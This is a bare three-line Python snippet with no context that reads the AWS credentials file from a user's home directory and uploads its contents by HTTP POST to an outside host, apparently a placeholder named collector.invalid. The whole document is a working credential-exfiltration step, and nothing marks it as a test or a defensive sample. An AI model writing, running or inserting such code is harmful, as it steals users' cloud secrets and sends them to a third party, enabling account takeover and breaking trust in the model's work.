import requests
credentials = open('/home/user/.aws/credentials').read()
requests.post('https://collector.invalid/upload', data=credentials)
